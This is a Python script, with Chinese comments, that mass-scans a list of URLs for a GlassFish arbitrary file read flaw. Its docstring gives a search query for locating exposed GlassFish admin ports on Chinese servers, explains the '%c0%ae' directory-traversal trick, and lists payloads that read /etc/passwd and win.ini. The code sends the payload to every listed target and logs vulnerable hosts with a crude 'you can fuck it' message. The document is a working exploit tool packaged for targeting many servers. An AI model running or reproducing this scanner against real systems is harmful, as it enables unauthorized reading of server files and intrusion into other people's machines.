"""
@为指针变量
@GlassFish任意文件读取漏洞
@鹰图:web.body="glassfish"&&ip.port="4848"&&ip.country="CN"&&icp.number!==""
@简介:
    glassfish 是一款 java 编写的跨平台的开源的应用服务器。
    java语言中会把 %c0%ae解析为 \uC0AE，最后转义为ASCCII字符的.（点）。利用 %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/来向上跳转，达到目录穿越、任意文件读取的效果。所以 glassfish 这个 poc 实际上就是../../../../../../../../../../../etc/passwd。
@linux_payload:
    /theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
@window_payload:
    /theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini
"""

import requests
from datetime import datetime
import urllib3


# 关键代码：屏蔽 "未验证 HTTPS 请求" 的警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    with open('url.txt', 'r+') as f:
        payload = "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
        for line in f:
            url=line.strip()
            # if not url:
            #     pass
            if url.startswith('#'):
                continue
            if not url.startswith(("http//","https://")):
                url=f"http://{url}"
            try:
                response=requests.get(url=url,verify=False,timeout=10)
                if response.status_code==200:
                    url_with_payload=url+payload
                    response_from_url_with_payload=requests.get(url=url_with_payload,verify=False)
                    if "root" in response_from_url_with_payload.text:
                        print(f"[+] There is an arbitrary file read vulnerability in  {url}")
                        print("you can fuck it!!!")
                        with open("./log/success.txt","a+",encoding='utf-8') as success_log, open("./log/log.txt","a+",encoding='utf-8') as log:
                            now = datetime.now()
                            str_now_with_success_log=f"[+] There is an arbitrary file read vulnerability in {url}"+"\t"+str(now)+"\n"+"you can fuck it!!!\n"
                            success_log.write(str_now_with_success_log)
                            log.write(str_now_with_success_log)
                    else:
                        #print(f"[-] {url} 不存在任意文件读取漏洞")
                        print(f"[-] There is no arbitrary file read vulnerability in {url}")
                        with open("./log/log.txt","a+",encoding='utf-8') as log:
                            now = datetime.now()
                            str_now_log=f"[-] There is no arbitrary file read vulnerability in {url}"+"\t"+str(now)+"\n"
                            log.writelines(str_now_log)
                else:
                    print(f"[-] {url}:->{response.status_code}")
                    with open('./log/log.txt','a+',encoding='utf-8') as log:
                        now = datetime.now()
                        log.write(f"[-] {url}:->{response.status_code}\t"+str(now)+"\n")
            except requests.exceptions.Timeout as e:
                print(f"[-] {url} request timeout")
                with open('./log/log.txt','a+',encoding='utf-8') as log:
                    now = datetime.now()
                    log.write(f"[-] {url} request timeout\t{str(now)}\n")
            except Exception as e:
                print(f"[-] {url} 异常:->{e}")
                with open('./log/log.txt','a+',encoding='utf-8') as log:
                    now = datetime.now()
                    log.write(f"[-] {url} 异常:->{e}\t{str(now)}\n")

if __name__ == '__main__':
    main()